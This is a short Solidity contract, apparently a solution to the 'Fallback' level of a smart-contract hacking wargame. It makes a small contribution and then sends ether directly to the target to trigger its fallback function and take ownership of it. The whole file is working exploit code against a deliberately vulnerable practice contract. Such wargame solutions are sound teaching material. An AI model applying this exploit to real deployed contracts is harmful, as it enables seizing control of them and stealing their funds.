pragma solidity ^0.8.0;

import '../levels/Fallback.sol';

contract FallbackAttack {
    Fallback public target;

    constructor(address payable _fallbackInstance) {
        target = Fallback(_fallbackInstance);
    }

    function attack() external payable {
        target.contribute{value: 0.0009999 ether}();
        (bool success, ) = address(target).call{value: 1}(new bytes(0));
        require(success, "Attack failed");
    }
}